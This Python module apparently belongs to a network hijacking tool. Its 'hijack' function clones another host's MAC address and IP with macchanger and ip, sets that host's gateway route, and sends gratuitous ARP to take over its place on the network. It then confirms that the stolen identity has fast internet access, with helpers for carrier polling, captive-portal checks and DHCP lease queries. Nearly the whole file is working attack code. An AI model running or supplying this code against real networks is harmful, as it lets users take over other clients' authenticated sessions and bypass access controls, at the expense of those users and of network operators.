"""
Library/adapter.py - Linux network adapter management, link carrier polling, fast MAC/IP configuration, and gratuitous ARP.
"""

import os
import re
import shutil
import socket
import sys
import time
import urllib.request

from .utils import (
    _run,
    log_info,
    log_plus,
    log_gplus,
    log_warning,
    log_minus,
    log_hijack
)


def get_carrier_status(interface):
    """
    Checks the Linux sysfs interface carrier and operstate.
    Returns True if carrier is detected (sysfs carrier == 1 or operstate in ['up', 'unknown']).
    """
    carrier_path = f"/sys/class/net/{interface}/carrier"
    operstate_path = f"/sys/class/net/{interface}/operstate"

    if os.path.exists(carrier_path):
        try:
            with open(carrier_path, "r") as f:
                val = f.read().strip()
                if val == "1":
                    return True
        except Exception:
            pass

    if os.path.exists(operstate_path):
        try:
            with open(operstate_path, "r") as f:
                val = f.read().strip().lower()
                if val in ("up", "unknown"):
                    return True
        except Exception:
            pass

    # Fallback to ip link command check
    rc, out = _run(f"ip link show dev {interface}", debug=False)
    if rc == 0 and ("LOWER_UP" in out or "state UP" in out or "state UNKNOWN" in out):
        return True

    return False


def wait_for_carrier(interface, timeout=5.0, poll_interval=0.05):
    """
    Polls sysfs carrier status until the interface hardware link becomes ready
    or timeout expires. Returns True if carrier detected, False on timeout.
    """
    start_time = time.time()
    while time.time() - start_time < timeout:
        if get_carrier_status(interface):
            return True
        time.sleep(poll_interval)
    return get_carrier_status(interface)


def send_gratuitous_arp(interface, local_ip, target_ip):
    """
    Sends Gratuitous ARP Unsolicited (ARP Request) and Gratuitous ARP Answer (ARP Reply)
    packets to rapidly update neighbor switches and gateway ARP tables.
    """
    if not local_ip or not target_ip:
        return

    # Gratuitous ARP Request (-U)
    _run(f"arping -c 2 -U -I {interface} -S {local_ip} {target_ip}", debug=False)
    # Gratuitous ARP Reply (-A)
    _run(f"arping -c 2 -A -I {interface} -S {local_ip} {target_ip}", debug=False)


def test_internet_speed(timeout=1.2, min_speed_kbps=5.0):
    """
    Tests actual download speed by fetching static assets from fast global CDNs.
    Measures throughput on body chunks to ensure high accuracy without long waits.
    Enforces a strict overall cumulative timeout budget across all endpoint probes.
    Returns tuple: (is_fast_enough: bool, measured_kbps: float)
    """
    speed_targets = [
        "http://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js",
        "http://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js",
        "http://www.gstatic.com/webp/gallery/1.sm.webp",
        "http://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
    ]
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    global_start = time.time()
    for url in speed_targets:
        if time.time() - global_start >= timeout:
            break
        try:
            req = urllib.request.Request(url, headers=headers)
            t_start = time.time()
            remaining = timeout - (t_start - global_start)
            if remaining <= 0.1:
                break
            per_req_timeout = min(0.5, remaining)

            with urllib.request.urlopen(req, timeout=per_req_timeout) as resp:
                bytes_received = 0
                first_chunk_time = None

                while time.time() - global_start < timeout:
                    chunk = resp.read(8192)
                    if not chunk:
                        break
                    if first_chunk_time is None:
                        first_chunk_time = time.time()
                    bytes_received += len(chunk)

                t_end = time.time()
                duration = max(t_end - (first_chunk_time or t_start), 0.001)

                if bytes_received > 0:
                    speed_kbps = (bytes_received / 1024.0) / duration
                    if speed_kbps >= min_speed_kbps:
                        return True, speed_kbps
                    else:
                        log_warning(f"Throttled connection detected: {speed_kbps:.2f} KB/s < {min_speed_kbps:.1f} KB/s threshold.")
                        return False, speed_kbps
        except Exception:
            continue

    return False, 0.0


def has_internet(timeout=0.8, strict=True, check_speed=True, min_speed_kbps=5.0):
    """
    Intense multi-stage internet verification check to guard against fake internet,
    captive portal walled gardens, and severely throttled connections (e.g. 1 byte/s).
    
    Checks:
    1. Low-level socket connection probe across multiple independent public endpoints (Google, Cloudflare, Quad9).
    2. HTTP 204 Connectivity Check (http://connectivitycheck.gstatic.com/generate_204).
    3. NCSI Content Verification (http://www.msftncsi.com/ncsi.txt -> expects 'Microsoft NCSI').
    4. HTTP/HTTPS probe fallbacks (ping.archlinux.org).
    5. Fast speed verification check (no long waits).
    """
    # Stage 1: Fast socket connection probe across multiple public endpoints
    public_endpoints = [
        ("8.8.8.8", 53),
        ("1.1.1.1", 53),
        ("9.9.9.9", 53),
        ("1.1.1.1", 443)
    ]
    
    socket_passed = False
    for host, port in public_endpoints:
        try:
            with socket.create_connection((host, port), timeout=timeout):
                socket_passed = True
                break
        except OSError:
            continue

    if not socket_passed:
        return False

    if not strict:
        if check_speed:
            is_fast, _ = test_internet_speed(timeout=1.2, min_speed_kbps=min_speed_kbps)
            return is_fast
        return True

    # Stage 2: Intense captive portal interception & real internet payload check
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    portal_passed = False

    # Test 2A: Google 204 No Content check
    try:
        req = urllib.request.Request("http://connectivitycheck.gstatic.com/generate_204", headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            if resp.status == 204:
                portal_passed = True
    except Exception:
        pass

    # Test 2B: Microsoft NCSI Verification Check
    if not portal_passed:
        try:
            req = urllib.request.Request("http://www.msftncsi.com/ncsi.txt", headers={"User-Agent": "Microsoft NCSI"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    body = resp.read(32).decode("utf-8", errors="ignore").strip()
                    if "Microsoft NCSI" in body:
                        portal_passed = True
        except Exception:
            pass

    # Test 2C: Arch / Linux ping probe
    if not portal_passed:
        try:
            req = urllib.request.Request("http://ping.archlinux.org/", headers=headers)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    body = resp.read(64).decode("utf-8", errors="ignore").strip()
                    if "Arch Linux" in body:
                        portal_passed = True
        except Exception:
            pass

    if not portal_passed:
        return False

    # Stage 3: Mandatory speed test to guard against throttled / 1 byte/s connections
    if check_speed:
        is_fast, _ = test_internet_speed(timeout=1.2, min_speed_kbps=min_speed_kbps)
        return is_fast

    return True


def restore(interface, macaddress, ipmask, broadcast, gateway):
    """Refined, fast network restoration procedure with link carrier synchronization."""
    log_info(f"Restoring original MAC ({macaddress}) and IP settings for interface {interface}...")

    _run(f"ip link set dev {interface} down")
    _run(f"macchanger -m {macaddress} {interface}")
    _run(f"ip link set dev {interface} up")

    # Wait deterministically for adapter hardware link ready state
    wait_for_carrier(interface, timeout=4.0)

    _run(f"ip addr flush dev {interface}")
    _run(f"ip addr add {ipmask} broadcast {broadcast} dev {interface}")
    _run(f"ip route flush dev {interface}")
    if gateway:
        _run(f"ip route replace default via {gateway} dev {interface}")

    local_ip_only = ipmask.split("/")[0] if "/" in ipmask else ipmask
    if gateway and local_ip_only:
        send_gratuitous_arp(interface, local_ip_only, gateway)

    log_plus("Successfully restored original network configuration.")


def hijack(interface, ip, mac, netmask, broadcast, gateway, max_retries=2, timeout_per_retry=4):
    """
    High-reliability network connection procedure:
    1. Bring interface down.
    2. Change MAC using macchanger -m.
    3. Bring interface up.
    4. Deterministically wait for link carrier / hardware readiness via sysfs polling.
    5. Flush old IP and assign target IP/netmask/broadcast.
    6. Flush old routes and set default gateway route.
    7. Send immediate Gratuitous ARP (-U and -A) to announce new MAC/IP to AP & Gateway.
    8. Verify interface state and check internet access.
    """
    log_hijack(f"[*] Impersonating host {ip} ({mac})...")

    for attempt in range(1, max_retries + 1):
        # 1. Bring down
        _run(f"ip link set dev {interface} down")

        # 2. Change MAC
        _run(f"macchanger -m {mac} {interface}")

        # 3. Bring up
        _run(f"ip link set dev {interface} up")

        # 4. Wait for carrier/link readiness
        wait_for_carrier(interface, timeout=3.0, poll_interval=0.05)

        # 5. Flush & set IP/netmask/broadcast
        _run(f"ip addr flush dev {interface}")
        _run(f"ip addr add {ip}/{netmask} broadcast {broadcast} dev {interface}")

        # 6. Set route
        _run(f"ip route flush dev {interface}")
        if gateway:
            _run(f"ip route replace default via {gateway} dev {interface}")

        # 7. Rapid Gratuitous ARP
        if gateway:
            send_gratuitous_arp(interface, ip, gateway)

        # 8. Verification loop
        start_time = time.time()
        verified = False

        while time.time() - start_time < timeout_per_retry:
            # Check MAC via macchanger -s
            rc, mac_out = _run(f"macchanger -s {interface}", debug=False)
            current_mac = None
            m = re.search(r"Current MAC:\s+([0-9a-fa-f:]+)", mac_out, re.IGNORECASE)
            if m:
                current_mac = m.group(1).lower()
            mac_ok = (current_mac == mac.lower())

            # Check IP & link state
            rc, if_out = _run(f"ip addr show dev {interface}", debug=False)
            ip_ok = (f"inet {ip}/" in if_out) or (f"inet {ip} " in if_out)
            conn_ok = ("UP" in if_out or "LOWER_UP" in if_out) and get_carrier_status(interface)

            if mac_ok and ip_ok and conn_ok:
                verified = True
                break

            time.sleep(0.2)

        if verified:
            has_base = has_internet(timeout=0.8, check_speed=False)
            if not has_base:
                log_hijack(f"\033[91m[-] NO INTERNET: Target {ip} ({mac}) has no internet connectivity.\033[0m")
                return False

            is_fast, speed_val = test_internet_speed(timeout=1.2, min_speed_kbps=5.0)
            if is_fast:
                log_hijack(f"\033[92m[+] SUCCESS! Internet verified via {ip} ({mac}) - Speed: {speed_val:.1f} KB/s\033[0m")
                return True
            else:
                if speed_val > 0:
                    log_hijack(f"\033[91m[-] SLOW INTERNET: Target {ip} ({mac}) speed is too low ({speed_val:.2f} KB/s < 5.0 KB/s threshold). Skipping...\033[0m")
                else:
                    log_hijack(f"\033[91m[-] SLOW / UNRESPONSIVE INTERNET: Target {ip} ({mac}) failed speed test threshold (0.00 KB/s). Skipping...\033[0m")
                return False

        if attempt < max_retries:
            time.sleep(0.5)

    log_hijack(f"\033[91m[-] Failed to impersonate {ip} ({mac})\033[0m")
    return False


def query_dhcp_lease_ip(interface, timeout=3.0):
    """
    Issues a DHCP Discover/Request packet for the current interface hardware MAC address
    to retrieve its exact leased IPv4 address from the network's DHCP server.
    """
    log_hijack(f"[*] Querying DHCP lease for interface {interface}...")

    if shutil.which("dhclient"):
        _run(f"dhclient -r {interface}", debug=False, timeout=2.0)
        _run(f"dhclient -1 -timeout 3 -pf /tmp/dhcp_{interface}.pid -lf /tmp/dhcp_{interface}.leases {interface}", debug=False, timeout=4.0)
        rc, out = _run(f"ip -o -4 addr show dev {interface}", debug=False, timeout=2.0)
        if out:
            m = re.search(r"inet\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", out)
            if m:
                ip = m.group(1)
                if ip not in ("0.0.0.0", "127.0.0.1"):
                    return ip

    try:
        from scapy.all import Ether, IP, UDP, BOOTP, DHCP, srp1, get_if_hwaddr
        mac_str = get_if_hwaddr(interface)
        mac_bytes = bytes.fromhex(mac_str.replace(":", ""))
        dhcp_discover = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac_bytes.ljust(16, b"\x00"), xid=0x12345678) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        ans = srp1(dhcp_discover, iface=interface, timeout=timeout, verbose=False)
        if ans and ans.haslayer(BOOTP):
            bootp = ans[BOOTP]
            if hasattr(bootp, "yiaddr") and str(bootp.yiaddr) not in ("0.0.0.0", "255.255.255.255"):
                return str(bootp.yiaddr)
            if hasattr(bootp, "ciaddr") and str(bootp.ciaddr) not in ("0.0.0.0", "255.255.255.255"):
                return str(bootp.ciaddr)
    except Exception:
        pass

    return None


